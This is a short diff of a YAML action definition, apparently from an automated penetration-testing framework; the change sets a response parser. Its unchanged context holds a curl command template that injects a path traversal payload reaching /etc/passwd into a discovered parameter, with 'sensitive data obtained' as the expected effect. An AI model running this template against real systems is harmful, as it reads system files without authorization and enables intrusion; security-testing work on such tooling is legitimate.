@@ -7,7 +7,7 @@ parameters:
   target_url: from_finding.url
   parameter: from_finding.parameter
 command_template: curl -s '{target_url}?{parameter}=../../../../../../../etc/passwd'
-parser: null
+parser: web_response_parser
 expected_effects:
 - file_read_achieved
 - sensitive_data_obtained
